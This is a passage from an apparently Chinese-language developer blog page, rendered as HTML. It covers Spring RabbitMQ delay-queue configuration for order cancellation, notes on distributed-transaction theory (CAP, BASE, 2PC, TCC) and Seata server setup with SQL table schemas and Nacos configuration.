class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        args<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"x-dead-letter-exchange\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Constant</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ORDER_CANCEL_EXCHANGE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        args<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"x-dead-letter-routing-key\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Constant</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ORDER_CANCEL_INVOKE_QUEUE_ROUTE_KEY</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        args<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"x-message-ttl\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Constant</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ORDER_CANCEL_TIME_DELAY_QUEUE_TTL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Queue</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Constant</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ORDER_CANCEL_TIME_DELAY_QUEUE</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * 创建普通队列,用于接收延时队列过期得消息, 接收死信,可以被监听到 然后做逻辑处理\n     * @return\n     */</span>\n    <span class=\"token annotation punctuation\">@Bean</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Queue</span> <span class=\"token function\">orderCancelInvokeQueue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Queue</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Constant</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ORDER_CANCEL_INVOKE_QUEUE</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * 创建绑定关系:延时队列和交换机得关联 绑定交换机和延时队列\n     * @return\n     */</span>\n    <span class=\"token annotation punctuation\">@Bean</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Binding</span> <span class=\"token function\">orderCancelDelayQueueBinding</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Binding</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Constant</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ORDER_CANCEL_TIME_DELAY_QUEUE</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Binding<span class=\"token punctuation\">.</span>DestinationType</span><span class=\"token punctuation\">.</span><span class=\"token constant\">QUEUE</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Constant</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ORDER_CANCEL_EXCHANGE</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Constant</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ORDER_CANCEL_TIME_DELAY_QUEUE_ROUTE_KEY</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * 创建绑定关系:普通队列和交换机得关联 绑定交换机和死信队列\n     * @return\n     */</span>\n    <span class=\"token annotation punctuation\">@Bean</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Binding</span> <span class=\"token function\">orderCancelInvokeQueueBinding</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Binding</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Constant</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ORDER_CANCEL_INVOKE_QUEUE</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Binding<span class=\"token punctuation\">.</span>DestinationType</span><span class=\"token punctuation\">.</span><span class=\"token constant\">QUEUE</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Constant</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ORDER_CANCEL_EXCHANGE</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Constant</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ORDER_CANCEL_INVOKE_QUEUE_ROUTE_KEY</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * 创建绑定关系:普通队列和交换机得关联 绑定ware库存得死信队列,不用等待,直接可以被ware监听到\n     * @return\n     */</span>\n    <span class=\"token annotation punctuation\">@Bean</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Binding</span> <span class=\"token function\">orderCancelEdQueueBinding</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Binding</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Constant</span><span class=\"token punctuation\">.</span><span class=\"token constant\">WARE_STOCK_RELEASE_QUEUE</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Binding<span class=\"token punctuation\">.</span>DestinationType</span><span class=\"token punctuation\">.</span><span class=\"token constant\">QUEUE</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Constant</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ORDER_CANCEL_EXCHANGE</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Constant</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ORDER_CANCEL_ED_RELEASE_WARE_STOCK_ROUTE_KEY</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n\n\n    <span class=\"token comment\">/**\n     * 定制RabbitTemplate,将确认回调设置进去\n     */</span>\n    <span class=\"token annotation punctuation\">@PostConstruct</span> <span class=\"token comment\">// MyRabbitConfig创建完成以后，执行这个方法</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">initRabbitTemplate</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\n        rabbitClient<span class=\"token punctuation\">.</span><span class=\"token function\">setConfirmCallback</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">RabbitTemplate<span class=\"token punctuation\">.</span>ConfirmCallback</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n            <span class=\"token comment\">/**\n             * 消息抵达exchange执行这个回调\n             * @param correlationData 回调的相关数据 当前消息的唯一关联数据(这个消息的唯一id)\n             * @param ack 消息是否成功收到, 只要消息抵达了服务器就是true\n             * @param cause 失败的原因\n             */</span>\n            <span class=\"token annotation punctuation\">@Override</span>\n            <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">confirm</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">CorrelationData</span> correlationData<span class=\"token punctuation\">,</span> <span class=\"token keyword\">boolean</span> ack<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> cause<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token comment\">// System.out.println(\"correlationData\" + correlationData);</span>\n                <span class=\"token comment\">// System.out.println(\"ack\" + ack);</span>\n                <span class=\"token comment\">// System.out.println(\"cause\" + cause);</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\n\n        rabbitClient<span class=\"token punctuation\">.</span><span class=\"token function\">setReturnsCallback</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">RabbitTemplate<span class=\"token punctuation\">.</span>ReturnsCallback</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n            <span class=\"token comment\">/**\n             * 只要消息没有投递给指定的队列，就触发这个回调\n             * @param returned 返回的消息和元数据\n             */</span>\n            <span class=\"token annotation punctuation\">@Override</span>\n            <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">returnedMessage</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ReturnedMessage</span> returned<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"returned\"</span> <span class=\"token operator\">+</span> returned<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"分布式事务\"><a href=\"#分布式事务\" class=\"headerlink\" title=\"分布式事务\"></a>分布式事务</h2><blockquote>\n<p>CAP原则</p>\n<ul>\n<li>一致性、可用性、分区容错性，CAP原则是指，这三个要素最多只能实现两个，不可能三个同时实现，在分布式系统中永远都要满足分区容错，所以只能CA二选一<blockquote>\n<ul>\n<li>一致性：成功就一起成功，失败也一起失败，保存一个值那么都保存一个值，在分布式系统中所有数据备份，在同一时刻必须有同样得值</li>\n<li>可用性：在集群中一部分节点故障后，集群整体还能响应客户端得读写请求</li>\n<li>分区容错性：大多数情况下，分布式系统都分布在多个子网络，每个子网络就叫做一个区，分区容错就是，区之间通信可能失败</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n</blockquote>\n<blockquote>\n<p>raft算法(保证一致性)</p>\n</blockquote>\n<p><a href=\"https://zinglix.xyz/2020/06/25/raft/\">动画解析</a></p>\n<blockquote>\n<p>BASE理论</p>\n<ul>\n<li>基本可用:损失时间(以前1秒得操作,现在5秒),损失功能(双11得时候,购物高峰期,可以引导用户去另一个页面)</li>\n<li>软状态:指允许系统存在中间状态,而该中间状态不会影响系统整体可用性,分布式一般都会将数据存储多份,允许同步延迟就是软状态得体现</li>\n<li>最终一致性:最终一致性指得是所有得数据经过一段时间后,最终达到一致得状态,弱一致和强一致相反,最终一致性是弱一致性得一种特殊情况</li>\n</ul>\n</blockquote>\n<blockquote>\n<p>分布式事务方案</p>\n<blockquote>\n<ul>\n<li>2PC(强一致):二阶提交,分两个阶段提交,影响性能<blockquote>\n<ul>\n<li>总事务管理器询问微服务得本地管理器准备好提交数据了吗,响应准备好了,这一个阶段是询问状态</li>\n<li>总事务管理器发送提交指令给微服务,如果有某一个微服务没有成功提交就回滚,这是第二阶段</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li>TCC(弱一致):柔性事务,TCC事务补偿型方案<blockquote>\n<ul>\n<li>让开发人员开发得时候开发三个代码提供给业务活动管理器回调,第一个Try尝试阶段,准备数据,第二个Confirm提交,第三个Cancel回滚</li>\n<li>提供这三个代码让业务活动管理器调用</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li>柔性事务-最大努力通知型<blockquote>\n<ul>\n<li>如果一个事务调用了多个微服务,那么有某一个微服务执行失败了,就将信息放到MQ中,让其他得微服务来订阅</li>\n<li>如果之前得某个微服务断线了,那么可以设置这个MQ消息一直发送,直到真正收到为止</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li>柔性事务-可靠消息+最终一致性方案(购物车结算得时候我们使用这个)<blockquote>\n<ul>\n<li>和<code>柔性事务-最大努力通知型</code>类似</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n</blockquote>\n</blockquote>\n<h3 id=\"seata-高并发不考虑\"><a href=\"#seata-高并发不考虑\" class=\"headerlink\" title=\"seata(高并发不考虑)\"></a>seata(高并发不考虑)</h3><blockquote>\n<p>创建undo_log数据表,分布式事务得数据库都创建,用于分布式事务回滚日志 建表脚本在源码中的script目录去找<br> <pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">TABLE</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>undo_log<span class=\"token punctuation\">`</span></span> <span class=\"token punctuation\">(</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>id<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">bigint</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span> <span class=\"token keyword\">AUTO_INCREMENT</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>branch_id<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">bigint</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>xid<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>context<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>rollback_info<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">longblob</span> <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>log_status<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">(</span><span class=\"token number\">11</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>log_created<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">datetime</span> <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>log_modified<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">datetime</span> <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>ext<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">DEFAULT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">PRIMARY</span> <span class=\"token keyword\">KEY</span> <span class=\"token punctuation\">(</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>id<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">UNIQUE</span> <span class=\"token keyword\">KEY</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>ux_undo_log<span class=\"token punctuation\">`</span></span> <span class=\"token punctuation\">(</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>xid<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">,</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>branch_id<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">USING</span> <span class=\"token keyword\">BTREE</span>\n<span class=\"token punctuation\">)</span> <span class=\"token keyword\">ENGINE</span><span class=\"token operator\">=</span><span class=\"token keyword\">InnoDB</span> <span class=\"token keyword\">DEFAULT</span> <span class=\"token keyword\">CHARSET</span><span class=\"token operator\">=</span>utf8<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br> <a href=\"https://github.com/seata/seata/releases\"><code>下载Seata-Server事务协调器(TC)</code></a></p>\n<p> <a href=\"https://github.com/seata/seata\"><code>下在Seata-Server对应版本源码</code></a></p>\n<p> 修改Seata-Server得registry.conf中得配置文件位置和注册中心位置,如下配置</p>\n</blockquote>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\"># 配置注册中心得位置\nregistry &#123;\n\n  type = \"nacos\"\n\n  nacos &#123;\n    application = \"seata-server\"\n    serverAddr = \"127.0.0.1:8848\"\n    group = \"SEATA_GROUP\"\n    namespace = \"mall-dev\"\n    cluster = \"default\" # 集群名字\n    username = \"nacos\"\n    password = \"nacos\"\n  &#125;\n&#125;\n\n# 配置配置文件得位置\nconfig &#123;\n\n  type = \"nacos\"\n\n  nacos &#123;\n    serverAddr = \"127.0.0.1:8848\"\n    namespace = \"mall-dev\"\n    group = \"SEATA_GROUP\"\n    username = \"nacos\"\n    password = \"nacos\"\n  &#125;\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p> 修改file.conf,主要就是 TC事务日志存储在哪里 如下配置</p>\n</blockquote>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\"># TC日志存放位置\nstore &#123;\n\n  mode = \"db\"\n\n  db &#123;\n    datasource = \"druid\"\n    dbType = \"mysql\"\n    driverClassName = \"com.mysql.jdbc.Driver\"\n    url = \"jdbc:mysql://127.0.0.1:3306/seata_server?rewriteBatchedStatements=true\" # 创建出来\n    user = \"root\"\n    password = \"lqs\"\n    minConn = 5\n    maxConn = 100\n    globalTable = \"global_table\" # 创建出来\n    branchTable = \"branch_table\" # 创建出来\n    lockTable = \"lock_table\" # 创建出来\n    queryLimit = 100\n    maxWait = 5000\n  &#125;\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<blockquote>\n<ul>\n<li>创建global_table 建表脚本在源码中的script目录去找</li>\n</ul>\n</blockquote>\n</blockquote>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">TABLE</span> <span class=\"token keyword\">IF</span> <span class=\"token operator\">NOT</span> <span class=\"token keyword\">EXISTS</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>global_table<span class=\"token punctuation\">`</span></span>\n<span class=\"token punctuation\">(</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>xid<span class=\"token punctuation\">`</span></span>                       <span class=\"token keyword\">VARCHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>transaction_id<span class=\"token punctuation\">`</span></span>            <span class=\"token keyword\">BIGINT</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>status<span class=\"token punctuation\">`</span></span>                    <span class=\"token keyword\">TINYINT</span>      <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>application_id<span class=\"token punctuation\">`</span></span>            <span class=\"token keyword\">VARCHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>transaction_service_group<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">VARCHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>transaction_name<span class=\"token punctuation\">`</span></span>          <span class=\"token keyword\">VARCHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>timeout<span class=\"token punctuation\">`</span></span>                   <span class=\"token keyword\">INT</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>begin_time<span class=\"token punctuation\">`</span></span>                <span class=\"token keyword\">BIGINT</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>application_data<span class=\"token punctuation\">`</span></span>          <span class=\"token keyword\">VARCHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">2000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>gmt_create<span class=\"token punctuation\">`</span></span>                <span class=\"token keyword\">DATETIME</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>gmt_modified<span class=\"token punctuation\">`</span></span>              <span class=\"token keyword\">DATETIME</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">PRIMARY</span> <span class=\"token keyword\">KEY</span> <span class=\"token punctuation\">(</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>xid<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">KEY</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>idx_gmt_modified_status<span class=\"token punctuation\">`</span></span> <span class=\"token punctuation\">(</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>gmt_modified<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">,</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>status<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">KEY</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>idx_transaction_id<span class=\"token punctuation\">`</span></span> <span class=\"token punctuation\">(</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>transaction_id<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">)</span> <span class=\"token keyword\">ENGINE</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">InnoDB</span>\n  <span class=\"token keyword\">DEFAULT</span> <span class=\"token keyword\">CHARSET</span> <span class=\"token operator\">=</span> utf8<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<blockquote>\n<ul>\n<li>创建branch_table 建表脚本在源码中的script目录去找</li>\n</ul>\n</blockquote>\n</blockquote>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">TABLE</span> <span class=\"token keyword\">IF</span> <span class=\"token operator\">NOT</span> <span class=\"token keyword\">EXISTS</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>branch_table<span class=\"token punctuation\">`</span></span>\n<span class=\"token punctuation\">(</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>branch_id<span class=\"token punctuation\">`</span></span>         <span class=\"token keyword\">BIGINT</span>       <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>xid<span class=\"token punctuation\">`</span></span>               <span class=\"token keyword\">VARCHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>transaction_id<span class=\"token punctuation\">`</span></span>    <span class=\"token keyword\">BIGINT</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>resource_group_id<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">VARCHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>resource_id<span class=\"token punctuation\">`</span></span>       <span class=\"token keyword\">VARCHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>branch_type<span class=\"token punctuation\">`</span></span>       <span class=\"token keyword\">VARCHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>status<span class=\"token punctuation\">`</span></span>            <span class=\"token keyword\">TINYINT</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>client_id<span class=\"token punctuation\">`</span></span>         <span class=\"token keyword\">VARCHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">64</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>application_data<span class=\"token punctuation\">`</span></span>  <span class=\"token keyword\">VARCHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">2000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>gmt_create<span class=\"token punctuation\">`</span></span>        <span class=\"token keyword\">DATETIME</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>gmt_modified<span class=\"token punctuation\">`</span></span>      <span class=\"token keyword\">DATETIME</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">PRIMARY</span> <span class=\"token keyword\">KEY</span> <span class=\"token punctuation\">(</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>branch_id<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">)</span><span 